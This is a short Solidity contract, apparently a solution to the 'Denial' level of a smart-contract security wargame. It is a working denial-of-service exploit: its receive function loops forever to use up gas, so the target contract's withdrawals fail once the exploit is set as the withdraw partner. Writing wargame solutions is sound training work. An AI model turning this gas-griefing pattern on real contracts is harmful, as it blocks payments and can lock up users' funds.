// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel20.sol";

contract DenialHack {
    // Denial level20 = Denial(0x46a7Ab2fF160773a451a8eFDbE56cb60f9420775);

    constructor() public {
        // level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
